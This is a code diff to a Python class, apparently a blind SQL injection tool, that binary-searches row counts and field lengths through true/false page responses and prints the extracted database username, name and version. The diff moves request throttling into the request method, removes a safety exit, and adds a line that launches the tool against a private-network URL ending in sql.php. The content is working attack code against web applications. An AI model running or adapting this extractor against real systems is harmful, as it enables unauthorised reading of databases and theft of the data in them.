@@ -77,7 +77,9 @@ class Blind:
         hdrs = result.headers
         if 'Content-Encoding' in hdrs and hdrs['Content-Encoding'] == 'gzip':
             data=zlib.decompress(result, 16+zlib.MAX_WBITS)
-        return self.request_successful(data)
+        result = self.request_successful(data)
+        time.sleep(self.timeout)
+        return result
 
     def request_successful(self, data):
         return self.good_string in data
@@ -115,9 +117,6 @@ class Blind:
             if self.make_request(params):
                 break;
             last *= 2
-            time.sleep(self.timeout)
-            if last > 200:
-                exit(0)
         sys.stdout.write('\rAt most count ' + str(last))
         sys.stdout.flush()
         first = last / 2
@@ -133,7 +132,6 @@ class Blind:
             else:
                 if first == last:                
                     return middle
-            time.sleep(self.timeout)
         return pri
 
     def guess_len(self, field, table, index):
@@ -145,7 +143,6 @@ class Blind:
             if self.make_request(params):
                 break;
             last *= 2
-            time.sleep(self.timeout)
         sys.stdout.write('\rAt most length ' + str(last))
         sys.stdout.flush()
         first = last / 2
@@ -161,7 +158,6 @@ class Blind:
             else:
                 if first == last:                
                     return middle
-            time.sleep(self.timeout)
         return pri
 
     def query_offset(self, field, table = None, offset=0):
@@ -263,3 +259,6 @@ class Blind:
         print '[+] Username: ' + username
         print '[+] Database: ' + database
         print '[+] Version:  ' + version
+
+
+Blind('http://192.168.0.137/writable/sql.php?param=1', 'information_schema').proof_of_concept()
